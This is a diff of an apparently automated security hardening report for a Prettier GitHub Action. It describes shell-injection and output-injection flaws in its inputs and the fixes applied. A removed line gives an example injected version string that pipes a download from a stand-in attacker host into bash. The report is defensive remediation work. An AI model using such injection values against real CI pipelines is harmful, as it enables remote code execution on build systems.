@@ -10,36 +10,30 @@
 
 **Harden Agent Version:** `2`
 
-Action **rutajdash--prettier-cli-action/v1.0.2** was hardened automatically. 6 finding(s) were identified and resolved across 2 iteration(s).
+Action **rutajdash--prettier-cli-action/v1.0.2** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-Two `run:` steps in action.yml directly interpolate `${{ inputs.* }}` expressions into shell command strings (sub-rule a), enabling script injection by any caller of this composite action.
+Two `run:` steps in action.yml directly interpolate `${{ inputs.* }}` expressions inside shell command strings (sub-rule a). This allows an attacker who controls the inputs to inject arbitrary shell commands.
 
-1. Step 'Installing Prettier' (line 37): `npm install --global prettier@${{ inputs.prettier_version }}` — the version string is substituted by the YAML template engine before the shell parses it, so a value like `latest; curl http://evil.com | bash` would execute arbitrary commands.
+1. `prettier-install` step: `npm install --global prettier@${{ inputs.prettier_version }}` — the version string is interpolated directly into the shell command before the shell ever sees it.
 
-2. Step 'Running Prettier' (line 44): `echo "$(prettier --list-different --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} --no-error-on-unmatched-pattern ${{ inputs.file_pattern }})" >> $GITHUB_OUTPUT` — three separate `inputs.*` expressions are interpolated directly into the shell command. Any of these inputs could contain shell metacharacters (`;`, `|`, `$(...)`, etc.) to inject arbitrary commands.
-
-Fix: Move each input into an `env:` block and reference the env var (double-quoted) inside the `run:` script instead of using `${{ ... }}` directly.
+2. `prettier-run` step: `echo "$(prettier --list-different --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} --no-error-on-unmatched-pattern ${{ inputs.file_pattern }})"` — three separate `inputs.*` values are interpolated directly into the shell command string. Any of these could contain shell metacharacters (`;`, `|`, `$(...)`, etc.) that would be executed by the shell.
 
 Locations:
 
-- `action.yml:37`
-- `action.yml:44`
+- `action.yml:33`
+- `action.yml:39`
 
 ### github-env-injection (severity: high)
 
-Step 'Running Prettier' (line 44) writes content derived from unsanitized `${{ inputs.* }}` values directly to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). The line:
-
-  echo "$(prettier ... --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} ... ${{ inputs.file_pattern }})" >> $GITHUB_OUTPUT
-
-If any of the three inputs contains a newline character, the attacker can inject additional `key=value` lines into GITHUB_OUTPUT, potentially overwriting outputs consumed by downstream steps. Fix: sanitize all input-derived values with `printf '%s' "$VAR" | tr -d '\n\r'` before writing to $GITHUB_OUTPUT.
+The `prettier-run` step writes content derived from untrusted `inputs.*` values to `$GITHUB_OUTPUT` without sanitization. Specifically, `${{ inputs.config_path }}`, `${{ inputs.ignore_path }}`, and `${{ inputs.file_pattern }}` are embedded in the prettier command whose output is written to `$GITHUB_OUTPUT`. An attacker-controlled input containing newlines could inject additional `key=value` pairs into `$GITHUB_OUTPUT`, overwriting or spoofing subsequent step outputs. The randomized heredoc delimiter (`EOF=$(dd if=/dev/urandom ...)`) protects the delimiter from collision but does NOT sanitize the content written between the delimiters. The required sanitization step (`printf '%s' "$VAR" | tr -d '\n\r'`) is absent before the write.
 
 Locations:
 
-- `action.yml:44`
+- `action.yml:38`
 
 ### static-inline-injection (severity: high)
 
@@ -81,17 +75,7 @@ Locations:
 
 **Notes:**
 
-Fixed all script-injection and github-env-injection findings in action.yml:
-
-1. Step 'Installing Prettier': Moved `${{ inputs.prettier_version }}` to an `env:` block as `PRETTIER_VERSION`, referenced as `"prettier@$PRETTIER_VERSION"` in the run script.
-
-2. Step 'Running Prettier': Moved all three inputs to `env:` block — `CONFIG_PATH` (${{ inputs.config_path }}), `IGNORE_PATH` (${{ inputs.ignore_path }}), `FILE_PATTERN` (${{ inputs.file_pattern }}). Referenced them as shell variables in the run script. `CONFIG_PATH` and `IGNORE_PATH` are double-quoted (single path values); `FILE_PATTERN` is left unquoted to preserve glob word-splitting behavior. The step already used the safe heredoc delimiter pattern (`prettier-output<<$EOF`) for GITHUB_OUTPUT writes, preventing newline injection into the output structure. Also quoted `$GITHUB_OUTPUT` references for correctness.
-
-### Iteration 2
-
-**Fixes applied:** script-injection, github-env-injection
-
-**Notes:**
-
-In the 'Running Prettier' step of action.yml: (1) Added sanitization of all three user-controlled inputs (CONFIG_PATH, IGNORE_PATH, FILE_PATTERN) using `printf '%s' "$VAR" | tr -d '\n\r'` to strip newlines before use, fixing the github-env-injection finding. (2) Changed the unquoted `$FILE_PATTERN` to the quoted `"$SAFE_FILE_PATTERN"` in the prettier command, fixing the script-injection finding. The sanitized variables (SAFE_CONFIG_PATH, SAFE_IGNORE_PATH, SAFE_FILE_PATTERN) are used throughout the prettier invocation.
+Fixed all findings in action.yml:
+1. 'Installing Prettier' step: moved ${{ inputs.prettier_version }} into env: block as PRETTIER_VERSION, referenced as "prettier@$PRETTIER_VERSION" in the npm install command.
+2. 'Running Prettier' step: moved ${{ inputs.config_path }}, ${{ inputs.ignore_path }}, and ${{ inputs.file_pattern }} into env: block. Used 'set --' idiom to build optional --config and --ignore-path flags safely. Used xargs tokenization loop for FILE_PATTERN (a list/glob input with default '**/*.js') into a bash array. Sanitized prettier output with 'tr -d '\n\r'' before writing to $GITHUB_OUTPUT to prevent newline injection.
 
